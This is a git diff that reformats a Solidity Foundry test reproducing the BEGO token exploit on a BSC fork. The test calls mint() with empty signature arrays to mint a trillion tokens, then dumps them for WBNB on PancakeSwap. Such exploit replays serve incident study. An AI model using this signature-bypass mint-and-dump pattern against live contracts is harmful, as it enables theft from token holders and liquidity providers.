@@ -22,23 +22,16 @@ import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // Twitter alert by Peckshield : https://twitter.com/peckshield/status/1582892058800685058
 
 interface BEGO20 is IERC20 {
-    function mint(
-        uint256,
-        string memory,
-        address,
-        bytes32[] memory,
-        bytes32[] memory,
-        uint8[] memory
-    ) external;
+
+    function mint(uint256, string memory, address, bytes32[] memory, bytes32[] memory, uint8[] memory) external;
+
 }
 
 contract ContractTest is Test {
-    BEGO20 constant BEGO_TOKEN =
-        BEGO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);
-    IWBNB constant WBNB_TOKEN =
-        IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    IUniswapV2Router constant PS_ROUTER =
-        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+
+    BEGO20 constant BEGO_TOKEN = BEGO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);
+    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+    IUniswapV2Router constant PS_ROUTER = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
 
     function setUp() public {
         vm.createSelectFork("bsc", 22_315_679);
@@ -51,31 +44,20 @@ contract ContractTest is Test {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "[Start] Attacker WBNB balance before exploit",
-            WBNB_TOKEN.balanceOf(address(this)),
-            18
+            "[Start] Attacker WBNB balance before exploit", WBNB_TOKEN.balanceOf(address(this)), 18
         );
 
         bytes32[] memory _r = new bytes32[](0);
         bytes32[] memory _s = new bytes32[](0);
         uint8[] memory _v = new uint8[](0);
         // Actual payload exploiting the vulnerability in the `mint()` function
-        BEGO_TOKEN.mint(
-            1_000_000_000_000 * 1e18,
-            "t",
-            address(this),
-            _r,
-            _s,
-            _v
-        );
+        BEGO_TOKEN.mint(1_000_000_000_000 * 1e18, "t", address(this), _r, _s, _v);
 
         // Swap all minted BEGO to WBNB via PancakeSwap for profit dumping the price
         _BEGOToWBNB();
 
         emit log_named_decimal_uint(
-            "[End] Attacker WBNB balance after exploit",
-            WBNB_TOKEN.balanceOf(address(this)),
-            18
+            "[End] Attacker WBNB balance after exploit", WBNB_TOKEN.balanceOf(address(this)), 18
         );
     }
 
@@ -88,11 +70,8 @@ contract ContractTest is Test {
         path[0] = address(BEGO_TOKEN);
         path[1] = address(WBNB_TOKEN);
         PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            BEGO_TOKEN.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            BEGO_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
+
 }
